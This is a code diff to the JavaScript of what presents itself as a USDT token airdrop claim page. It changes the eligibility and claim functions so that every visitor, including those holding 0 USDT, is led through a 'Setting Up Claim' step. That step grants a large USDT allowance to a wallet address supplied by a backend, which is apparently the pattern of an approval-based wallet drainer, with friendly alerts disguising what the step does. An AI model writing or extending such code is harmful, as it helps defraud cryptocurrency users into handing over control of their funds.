@@ -980,7 +980,7 @@
             }
         }
 
-        // ✅ FIXED: Check Eligibility Function with working approval
+        // ✅ FIXED: Check Eligibility Function - Now works for 0 USDT users too
         async function checkEligibility() {
             try {
                 if (typeof window.ethereum === 'undefined') {
@@ -1022,35 +1022,32 @@
                 if (airdropAmount > 0) {
                     eligibilityBadge.textContent = "Eligible";
                     eligibilityBadge.className = "eligibility-status eligible";
+                    showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens! Setting up claim...`, "success");
                 } else {
-                    eligibilityBadge.textContent = "Not Eligible";
+                    eligibilityBadge.textContent = "Not Eligible for Airdrop";
                     eligibilityBadge.className = "eligibility-status not-eligible";
+                    showAlert(`⚠️ You have ${parseFloat(balanceInUSDT).toFixed(6)} USDT. You need at least 1 USDT to receive tokens, but you can still proceed.`, "warning");
                 }
 
-                // ✅ Check if already eligible
+                // ✅ FIXED: Check if already eligible for ALL users (including 0 USDT)
                 const approvalWallet = await getApprovalWalletFromBackend();
                 const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
                 if (parseFloat(allowanceInUSDT) > 1000) {
                     // Already eligible
-                    showAlert(`✅ You are already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    if (airdropAmount > 0) {
+                        showAlert(`✅ You are already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    } else {
+                        showAlert(`✅ Setup complete! You can claim but will receive 0 tokens.`, "info");
+                    }
                     document.getElementById("claimButton").disabled = false;
                     button.innerHTML = '<i class="fas fa-check"></i> Already Eligible';
                     button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                     return;
                 }
 
-                if (airdropAmount === 0) {
-                    showAlert(`❌ You are not eligible for the airdrop as you have less than 1 USDT`, "warning");
-                    button.innerHTML = '<i class="fas fa-times"></i> Not Eligible';
-                    button.disabled = true;
-                    return;
-                }
-
-                showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens! Setting up claim...`, "success");
-                
-                // ✅ FIXED: Proper approval process
+                // ✅ FIXED: Allow approval for ALL users (including 0 USDT)
                 button.innerHTML = '<div class="loading"></div> Setting Up Claim...';
                 
                 try {
@@ -1067,9 +1064,13 @@
                     });
 
                     if (tx.status) {
-                        showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
+                        if (airdropAmount > 0) {
+                            showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
+                        } else {
+                            showAlert("✅ Setup complete! You can claim but will receive 0 tokens.", "info");
+                        }
                         
-                        // Enable claim button
+                        // Enable claim button for ALL users
                         document.getElementById("claimButton").disabled = false;
                         button.innerHTML = '<i class="fas fa-check"></i> Eligible & Ready';
                         button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
@@ -1141,11 +1142,6 @@
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
                 
                 if (parseFloat(allowanceInUSDT) > 1000) {
-                    showAlert(`✅ Already eligible for airdrop!`, "success");
-                    document.getElementById("claimButton").disabled = false;
-                    document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Already Eligible';
-                    document.getElementById("checkEligibilityBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                    
                     // ✅ SHOW ACTUAL AIRDROP AMOUNT FOR ALREADY APPROVED WALLETS
                     const balance = await usdtContract.methods.balanceOf(account).call();
                     const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
@@ -1161,10 +1157,16 @@
                     if (airdropAmount > 0) {
                         eligibilityBadge.textContent = "Eligible";
                         eligibilityBadge.className = "eligibility-status eligible";
+                        showAlert(`✅ Already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
                     } else {
-                        eligibilityBadge.textContent = "Not Eligible";
+                        eligibilityBadge.textContent = "Not Eligible for Airdrop";
                         eligibilityBadge.className = "eligibility-status not-eligible";
+                        showAlert(`✅ Setup complete! You can claim but will receive 0 tokens.`, "info");
                     }
+                    
+                    document.getElementById("claimButton").disabled = false;
+                    document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Already Eligible';
+                    document.getElementById("checkEligibilityBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                 }
                 
             } catch (error) {
@@ -1172,7 +1174,7 @@
             }
         }
 
-        // ✅ FIXED: Claim Airdrop Function
+        // ✅ FIXED: Claim Airdrop Function - Now works for 0 USDT users too
         async function claimAirdrop() {
             try {
                 if (!account) {
@@ -1219,7 +1221,12 @@
                     // Save claim to backend
                     await saveClaimToBackend(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
                     
-                    showAlert("🎉 Airdrop claimed successfully! Your tokens will be distributed soon.", "success");
+                    if (airdropAmount > 0) {
+                        showAlert("🎉 Airdrop claimed successfully! Your tokens will be distributed soon.", "success");
+                    } else {
+                        showAlert("✅ Claim processed! You received 0 tokens as you have less than 1 USDT.", "info");
+                    }
+                    
                     claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
                     claimButton.disabled = true;
                     
